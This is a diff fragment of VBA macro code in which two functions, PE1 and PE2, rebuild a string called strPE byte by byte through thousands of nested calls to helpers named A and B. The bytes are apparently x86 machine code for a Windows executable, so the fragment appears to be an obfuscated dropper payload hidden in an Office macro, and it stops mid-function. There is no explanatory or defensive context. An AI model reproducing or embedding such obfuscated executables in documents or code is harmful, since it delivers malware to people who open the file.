+    strPE = B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 131), 236), 24), 201), 233), 237), 254), 255), 255), 144), "f"), 144), "f"), 144), "f"), 144), "f"), 144), 161), " 4@"), 0), 139), 0), 133), 192), "t%"), 131), 236), 12), "f"), 144), 255), 208), 161), " 4@"), 0), 141), "P"), 4), 139), "@"), 4), 137), 21), " ")
+    strPE = B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(strPE, "4@"), 0), 133), 192), "u"), 233), 131), 196), 12), 195), 141), "t&"), 0), 144), 243), 195), 141), 180), "&"), 0), 0), 0), 0), 141), 180), "&"), 0), 0), 0), 0), "S"), 131), 236), 24), 139), 29), "p)@"), 0), 131), 251), 255), "t!"), 133), 219), "t")
+    strPE = A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 12), 255), 20), 157), "p)@"), 0), 131), 235), 1), "u"), 244), 199), 4), "$`"), 24), "@"), 0), 232), 245), 251), 255), 255), 131), 196), 24), "["), 195), "1"), 219), 235), 2), 137), 195), 141), "C"), 1), 139), 20), 133), "p)@"), 0), 133), 210), "u"), 240)
+    strPE = A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 235), 201), 141), 180), "&"), 0), 0), 0), 0), 141), "v"), 0), 161), " P@"), 0), 133), 192), "t"), 7), 243), 195), 141), "t&"), 0), 144), 199), 5), " P@"), 0), 1), 0), 0), 0), 235), 148), 144), 144), 144), 144), 255), "%"), 148), "a@"), 0)
+    strPE = A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "1"), 192), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "UWVS"), 131), 236), ","), 161), "D4@"), 0), 199), "D$"), 16), 0), 0), 0), 0), 199), "D$"), 20)
+    strPE = A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "=N"), 230), "@"), 187), "t"), 15), 247), 208), 163), "H4@"), 0), 131), 196), ",[^_]"), 195), 141), "D$"), 16), 137), 4), "$"), 255), 21), "Ha@"), 0), 131), 236), 4), 139), "\$"), 16), "3\$"), 20)
+    strPE = A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 255), 21), "8a@"), 0), 137), 197), 255), 21), "<a@"), 0), 137), 199), 255), 21), "La@"), 0), 137), 198), 141), "D$"), 24), 137), 4), "$"), 255), 21), "`a@"), 0), 131), 236), 4), 139), "D$"), 24), "1"), 216), "3D$"), 28)
+    strPE = B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(strPE, "1"), 232), "1"), 248), "1"), 240), "=N"), 230), "@"), 187), "t"), 23), 137), 194), 247), 210), 163), "D4@"), 0), 137), 21), "H4@"), 0), 131), 196), ",[^_]"), 195), 186), 176), 25), 191), "D"), 184), "O"), 230), "@"), 187), 235), 225), 141), "t")
+    strPE = B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(strPE, "&"), 0), "U"), 137), 229), 131), 236), "("), 199), 5), " S@"), 0), 9), 4), 0), 192), 139), "E"), 4), 141), "U"), 4), 199), 5), "$S@"), 0), 1), 0), 0), 0), 199), 4), "$"), 0), 0), 0), 0), 137), 21), 4), "Q@"), 0), 163), 248), "P")
+    strPE = B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(strPE, "@"), 0), 163), ",S@"), 0), 139), "E"), 8), 163), 236), "P@"), 0), 161), "D4@"), 0), 137), "E"), 240), 161), "H4@"), 0), 137), "E"), 244), 255), 21), "ha@"), 0), 131), 236), 4), 199), 4), "$@@@"), 0), 255), 21), "x")
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(strPE, "a@"), 0), 131), 236), 4), 255), 21), "4a@"), 0), 199), "D$"), 4), 9), 4), 0), 192), 137), 4), "$"), 255), 21), "pa@"), 0), 131), 236), 8), 232), 229), 13), 0), 0), 144), 144), 144), 144), 144), 144), 144), 144), 144), 131), 236), 28), 139)
+    strPE = A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "D$$"), 131), 248), 3), "t"), 20), 133), 192), "t"), 16), 184), 1), 0), 0), 0), 131), 196), 28), 194), 12), 0), 141), "t&"), 0), 144), 139), "T$("), 137), "D$"), 4), 139), "D$ "), 137), "T$"), 8), 137), 4), "$"), 232), 200), 8)
+    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 184), 1), 0), 0), 0), 131), 196), 28), 194), 12), 0), 141), 180), "&"), 0), 0), 0), 0), 141), 182), 0), 0), 0), 0), "VS"), 131), 236), 20), 131), "=04@"), 0), 2), 139), "D$$t"), 10), 199), 5), "04@"), 0)
+    strPE = A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 2), 0), 0), 0), 131), 248), 2), "t"), 18), 131), 248), 1), "t:"), 131), 196), 20), 184), 1), 0), 0), 0), "[^"), 194), 12), 0), 187), "0p@"), 0), 190), "0p@"), 0), "9"), 222), "t"), 229), 139), 3), 133), 192), "t"), 2), 255), 208), 131)
+    strPE = A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 195), 4), "9"), 222), "u"), 241), 131), 196), 20), 184), 1), 0), 0), 0), "[^"), 194), 12), 0), 141), "v"), 0), 139), "D$("), 199), "D$"), 4), 1), 0), 0), 0), 137), "D$"), 8), 139), "D$ "), 137), 4), "$"), 232), "4"), 8), 0), 0)
+    strPE = B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 131), 196), 20), 184), 1), 0), 0), 0), "[^"), 194), 12), 0), 141), 180), "&"), 0), 0), 0), 0), "1"), 192), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 131), 236), "<"), 161), 148), "S@"), 0), 221), "D$H"), 221), "D")
+    strPE = A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(strPE, "$P"), 133), 192), 221), "D$Xt)"), 217), 202), 139), "T$@"), 221), "\$"), 24), 221), "\$ "), 137), "T$"), 16), 139), "T$D"), 221), "\$("), 137), "T$"), 20), 141), "T$"), 16), 137), 20), "$"), 255), 208), 235)
+    strPE = B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 6), 221), 216), 221), 216), 221), 216), 131), 196), "<"), 195), 141), "t&"), 0), 144), 139), "D$"), 4), 163), 148), "S@"), 0), 233), 182), 12), 0), 0), "f"), 144), "VS"), 187), "d@@"), 0), 131), 236), "T"), 139), "D$`"), 139), 8), 141), "Q")
+    strPE = A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(strPE, 255), 131), 250), 5), "w"), 7), 139), 28), 149), 128), "A@"), 0), 221), "@"), 24), 139), "p"), 4), 221), "\$H"), 221), "@"), 16), 221), "\$@"), 221), "@"), 8), 199), 4), "$"), 2), 0), 0), 0), 221), "\$8"), 232), 157), 12), 0), 0), 221)
+    strPE = B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(B(strPE, "D$H"), 137), "t$"), 12), 137), "\$"), 8), 221), "\$ "), 199), "D$"), 4), "t@@"), 0), 137), 4), "$"), 221), "D$@"), 221), "\$"), 24), 221), "D$8"), 221), "\$"), 16), 232), 1), 12), 0), 0), 131), 196), "T")
+    strPE = A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "1"), 192), "[^"), 195), 144), 144), 144), 144), 144), 219), 227), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 139), "D$"), 4), 195), 141), 180), "&"), 0), 0), 0), 0), 141), "t&"), 0), 139), "D$"), 4), 195), 144), 144), 144)
+    strPE = A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), 144), 144), 144), "WVS"), 131), 236), "0"), 139), "5"), 160), "S@"), 0), 133), 246), 15), 142), 252), 0), 0), 0), 139), "="), 164), "S@"), 0), "1"), 219), 141), "W"), 12), 144), 139), 10), "9"), 193), "w"), 14), 139), "z"), 4), 3)
+    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "O"), 8), "9"), 200), 15), 130), 129), 0), 0), 0), 131), 195), 1), 131), 194), 20), "9"), 243), "u"), 226), 137), 4), "$"), 137), 195), 232), 168), 8), 0), 0), 133), 192), 137), 199), 15), 132), 229), 0), 0), 0), 161), 164), "S@"), 0), 141), 28), 182), 193), 227)
+    strPE = A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 2), 1), 216), 137), "x"), 16), 199), 0), 0), 0), 0), 0), 232), 131), 9), 0), 0), 3), "G"), 12), 139), 21), 164), "S@"), 0), 137), "D"), 26), 12), 141), "T$"), 20), 199), "D$"), 8), 28), 0), 0), 0), 137), 4), "$"), 137), "T$"), 4), 255)
+    strPE = A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(strPE, 21), 128), "a@"), 0), 131), 236), 12), 133), 192), "t}"), 139), "D$("), 141), "P"), 192), 131), 226), 191), "t"), 8), 131), 232), 4), 131), 224), 251), "u"), 18), 131), 5), 160), "S@"), 0), 1), 131), 196), "0[^_"), 195), 141), "t&"), 0)
+    strPE = A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(strPE, 3), 29), 164), "S@"), 0), 139), "D$"), 20), 139), "T$ "), 137), "C"), 4), 137), "S"), 8), 137), "\$"), 12), 199), "D$"), 8), "@"), 0), 0), 0), 137), "T$"), 4), 137), 4), "$"), 255), 21), "|a@"), 0), 131), 236), 16), 133), 192)
+    strPE = A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(strPE, "u"), 186), 255), 21), "@a@"), 0), 199), 4), "$"), 8), "B@"), 0), 137), "D$"), 4), 232), 138), 11), 0), 0), 141), 182), 0), 0), 0), 0), "1"), 246), 233), "'"), 255), 255), 255), 161), 164), "S@"), 0), 139), "D"), 24), 12), 137), "D$"), 8)
+    strPE = B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(strPE, 139), "G"), 8), 199), 4), "$"), 212), "A@"), 0), 137), "D$"), 4), 232), "]"), 11), 0), 0), 137), "\$"), 4), 199), 4), "$"), 180), "A@"), 0), 232), "M"), 11), 0), 0), 141), 180), "&"), 0), 0), 0), 0), "f"), 144), "U"), 137), 229), "WVS")
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 131), 236), "<"), 139), 29), 156), "S@"), 0), 133), 219), "t"), 13), 141), "e"), 244), "[^_]"), 195), 141), "t&"), 0), 144), 199), 5), 156), "S@"), 0), 1), 0), 0), 0), 232), 225), 7), 0), 0), 141), 4), 128), 141), 4), 133), 30), 0), 0)
+    strPE = A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 131), 224), 240), 232), 191), 9), 0), 0), 199), 5), 160), "S@"), 0), 0), 0), 0), 0), ")"), 196), 141), "D$"), 31), 131), 224), 240), 163), 164), "S@"), 0), 184), "0F@"), 0), "-0F@"), 0), 131), 248), 7), "~"), 171), 131), 248)
+    strPE = A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 11), 139), 21), "0F@"), 0), 15), 142), 186), 0), 0), 0), 133), 210), 15), 132), "6"), 1), 0), 0), 185), "0F@"), 0), 129), 249), "0F@"), 0), "s"), 135), 141), "q"), 8), 184), "7F@"), 0), 137), "]"), 208), 137), 202), ")"), 240), 137)
+    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(strPE, 243), 193), 232), 3), 141), "D"), 193), 8), 137), "E"), 212), 235), 10), 141), 180), "&"), 0), 0), 0), 0), 131), 195), 8), 139), "z"), 4), 139), 18), 139), 183), 0), 0), "@"), 0), 141), 135), 0), 0), "@"), 0), 1), 214), 232), 229), 253), 255), 255), ";]"), 212)
+    strPE = A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(strPE, 137), 183), 0), 0), "@"), 0), 137), 218), "u"), 216), 139), "]"), 208), 139), "5"), 160), "S@"), 0), 133), 246), 15), 142), "*"), 255), 255), 255), 139), "5|a@"), 0), 141), "}"), 228), 139), 21), 164), "S@"), 0), 141), 4), 155), 141), 4), 130), 139), 16)
+    strPE = A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(strPE, 133), 210), "t"), 26), 137), "|$"), 12), 137), "T$"), 8), 139), "P"), 8), 137), "T$"), 4), 139), "@"), 4), 137), 4), "$"), 255), 214), 131), 236), 16), 131), 195), 1), ";"), 29), 160), "S@"), 0), "|"), 201), 141), "e"), 244), "[^_]"), 195), 185)
+    strPE = A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(strPE, "0F@"), 0), 133), 210), 15), 133), "F"), 255), 255), 255), 139), "A"), 4), 133), 192), 15), 133), ";"), 255), 255), 255), 139), "A"), 8), 131), 248), 1), 15), 133), 27), 1), 0), 0), 141), "q"), 12), 129), 254), "0F@"), 0), 15), 131), 175), 254), 255), 255)
+
+    PE1 = strPE
+End Function
+
+Private Function PE2() As String
+   Dim strPE As String
+
+    strPE = ""
+    strPE = B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(strPE, 137), "]"), 204), 141), 180), "&"), 0), 0), 0), 0), "f"), 144), 139), 6), 15), 182), "^"), 8), 139), "N"), 4), 141), 144), 0), 0), "@"), 0), 139), 128), 0), 0), "@"), 0), 131), 251), 16), 141), 185), 0), 0), "@"), 0), 137), "E"), 212), "tN"), 131), 251), " ")
+    strPE = B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 15), 132), 182), 0), 0), 0), 131), 251), 8), 15), 132), 139), 0), 0), 0), 137), "\$"), 4), 199), 4), "$dB@"), 0), 232), 143), 9), 0), 0), 139), 13), "4F@"), 0), 133), 201), 15), 133), 188), 254), 255), 255), 139), 21), "8F@")
+    strPE = A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 133), 210), 15), 133), 149), 0), 0), 0), 139), 21), "<F@"), 0), 185), "<F@"), 0), 233), "U"), 255), 255), 255), 15), 183), 153), 0), 0), "@"), 0), 137), "M"), 208), 137), 216), 13), 0), 0), 255), 255), "f"), 131), 185), 0), 0), "@"), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(strPE, 15), "H"), 216), 137), 248), ")"), 211), 3), "]"), 212), 232), 167), 252), 255), 255), 139), "M"), 208), "f"), 137), 153), 0), 0), "@"), 0), 131), 198), 12), 129), 254), "0F@"), 0), 15), 130), "N"), 255), 255), 255), 139), "]"), 204), 233), 177), 254), 255), 255), 141), 182)
+    strPE = A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 15), 182), 15), 137), 203), 129), 203), 0), 255), 255), 255), 128), "?"), 0), 15), "H"), 203), ")"), 209), 1), 200), 137), 195), 137), 248), 232), "b"), 252), 255), 255), 136), 31), 235), 193), 139), "E"), 212), ")"), 208), 3), 7), 137), 195), 137), 248), 232)
+    strPE = A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "N"), 252), 255), 255), 137), 31), 235), 173), 185), "0F@"), 0), 233), 217), 254), 255), 255), 137), "D$"), 4), 199), 4), "$0B@"), 0), 232), 196), 8), 0), 0), "S"), 131), 236), 24), 139), "\$ "), 139), 3), 139), 0), "="), 145), 0), 0)
+    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(strPE, 192), "wM="), 141), 0), 0), 192), "s[="), 5), 0), 0), 192), 15), 133), 192), 0), 0), 0), 199), "D$"), 4), 0), 0), 0), 0), 199), 4), "$"), 11), 0), 0), 0), 232), 147), 7), 0), 0), 131), 248), 1), 15), 132), ","), 1), 0), 0)
+    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(strPE, 133), 192), "tT"), 199), 4), "$"), 11), 0), 0), 0), 255), 208), 184), 255), 255), 255), 255), 233), 213), 0), 0), 0), 141), 180), "&"), 0), 0), 0), 0), "="), 148), 0), 0), 192), "tJ="), 150), 0), 0), 192), "t~="), 147), 0), 0), 192), "u")
+    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(strPE, "%"), 199), "D$"), 4), 0), 0), 0), 0), 199), 4), "$"), 8), 0), 0), 0), 232), "C"), 7), 0), 0), 131), 248), 1), 15), 132), 163), 0), 0), 0), 133), 192), 15), 133), 134), 0), 0), 0), 161), 172), "S@"), 0), 133), 192), 15), 132), 233), 0), 0)
+    strPE = A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 0), 137), "\$ "), 131), 196), 24), "["), 255), 224), 199), "D$"), 4), 0), 0), 0), 0), 199), 4), "$"), 8), 0), 0), 0), 232), 7), 7), 0), 0), 131), 248), 1), "u"), 200), 199), "D$"), 4), 1), 0), 0), 0), 199), 4), "$"), 8), 0), 0)
+    strPE = A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 232), 238), 6), 0), 0), 184), 255), 255), 255), 255), 235), "I="), 29), 0), 0), 192), "u"), 174), 199), "D$"), 4), 0), 0), 0), 0), 199), 4), "$"), 4), 0), 0), 0), 232), 204), 6), 0), 0), 131), 248), 1), "tP"), 133), 192), "t"), 145), 199)
+    strPE = A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 4), "$"), 4), 0), 0), 0), 255), 208), 184), 255), 255), 255), 255), 235), 21), 141), 180), "&"), 0), 0), 0), 0), 199), 4), "$"), 8), 0), 0), 0), 255), 208), 184), 255), 255), 255), 255), 131), 196), 24), "["), 194), 4), 0), 199), "D$"), 4), 1), 0), 0)
+    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(strPE, 0), 199), 4), "$"), 8), 0), 0), 0), 232), 131), 6), 0), 0), 232), 178), 250), 255), 255), 184), 255), 255), 255), 255), 235), 217), 199), "D$"), 4), 1), 0), 0), 0), 199), 4), "$"), 4), 0), 0), 0), 232), "c"), 6), 0), 0), 131), 200), 255), 235), 192)
+    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 199), "D$"), 4), 1), 0), 0), 0), 199), 4), "$"), 11), 0), 0), 0), 232), "J"), 6), 0), 0), 131), 200), 255), 235), 167), 141), 180), "&"), 0), 0), 0), 0), "f"), 144), "1"), 192), 235), 154), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144)
+    strPE = A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(strPE, "UWVS"), 131), 236), 28), 199), 4), "$"), 184), "S@"), 0), 255), 21), "0a@"), 0), 139), 29), 176), "S@"), 0), 131), 236), 4), 133), 219), "t4"), 139), "-ta@"), 0), 139), "=@a@"), 0), 141), "v"), 0), 139), 3)
+    strPE = A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 137), 4), "$"), 255), 213), 131), 236), 4), 137), 198), 255), 215), 133), 192), "u"), 12), 133), 246), "t"), 8), 139), "C"), 4), 137), "4$"), 255), 208), 139), "["), 8), 133), 219), "u"), 219), 199), 4), "$"), 184), "S@"), 0), 255), 21), "\a@"), 0), 131), 236)
+    strPE = A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(strPE, 4), 131), 196), 28), "[^_]"), 195), 141), "v"), 0), "VS1"), 246), 131), 236), 20), 161), 180), "S@"), 0), 133), 192), "u"), 16), 131), 196), 20), 137), 240), "[^"), 195), 141), 180), "&"), 0), 0), 0), 0), 144), 199), "D$"), 4), 12), 0)
+    strPE = B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 199), 4), "$"), 1), 0), 0), 0), 232), 192), 5), 0), 0), 133), 192), 137), 195), "tC"), 139), "D$ "), 199), 4), "$"), 184), "S@"), 0), 137), 3), 139), "D$$"), 137), "C"), 4), 255), 21), "0a@"), 0), 161), 176), "S@")
+    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(strPE, 0), 131), 236), 4), 137), 29), 176), "S@"), 0), 199), 4), "$"), 184), "S@"), 0), 137), "C"), 8), 255), 21), "\a@"), 0), 131), 236), 4), 137), 240), 131), 196), 20), "[^"), 195), 190), 255), 255), 255), 255), 235), 140), 141), 180), "&"), 0), 0), 0)
+    strPE = B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(strPE, 0), 141), "t&"), 0), 144), "S"), 131), 236), 24), 161), 180), "S@"), 0), 139), "\$ "), 133), 192), "u"), 15), 131), 196), 24), "1"), 192), "["), 195), 141), 180), "&"), 0), 0), 0), 0), 144), 199), 4), "$"), 184), "S@"), 0), 255), 21), "0a@")
+    strPE = A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 139), 21), 176), "S@"), 0), 131), 236), 4), 133), 210), "t"), 23), 139), 2), "9"), 195), "u"), 10), 235), ">"), 139), 8), "9"), 217), "t("), 137), 194), 139), "B"), 8), 133), 192), "u"), 241), 199), 4), "$"), 184), "S@"), 0), 255), 21), "\a@"), 0)
+    strPE = A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 131), 236), 4), "1"), 192), 131), 196), 24), "["), 195), 141), 180), "&"), 0), 0), 0), 0), 144), 139), "H"), 8), 137), "J"), 8), 137), 4), "$"), 232), 206), 4), 0), 0), 235), 209), 139), "B"), 8), 163), 176), "S@"), 0), 137), 208), 235), 234), 141), "t&"), 0)
+    strPE = A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "S"), 131), 236), 24), 139), "D$$"), 131), 248), 1), 15), 132), 143), 0), 0), 0), "r-"), 131), 248), 2), "t"), 24), 131), 248), 3), "u"), 24), 161), 180), "S@"), 0), 133), 192), "t"), 15), 232), "E"), 254), 255), 255), 235), 8), 141), "v"), 0), 232), 155)
+    strPE = A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 248), 255), 255), 131), 196), 24), 184), 1), 0), 0), 0), "["), 195), 144), 161), 180), "S@"), 0), 133), 192), 15), 133), 133), 0), 0), 0), 161), 180), "S@"), 0), 131), 248), 1), "u"), 222), 161), 176), "S@"), 0), 133), 192), "t"), 17), 139), "X"), 8), 137)
+    strPE = A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(strPE, 4), "$"), 232), "Q"), 4), 0), 0), 133), 219), 137), 216), "u"), 239), 199), 5), 176), "S@"), 0), 0), 0), 0), 0), 199), 5), 180), "S@"), 0), 0), 0), 0), 0), 199), 4), "$"), 184), "S@"), 0), 255), 21), ",a@"), 0), 131), 236), 4), 235)
+    strPE = A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 158), 141), 180), "&"), 0), 0), 0), 0), "f"), 144), 161), 180), "S@"), 0), 133), 192), "t"), 23), 199), 5), 180), "S@"), 0), 1), 0), 0), 0), 131), 196), 24), 184), 1), 0), 0), 0), "["), 195), 141), "v"), 0), 199), 4), "$"), 184), "S@"), 0), 255)
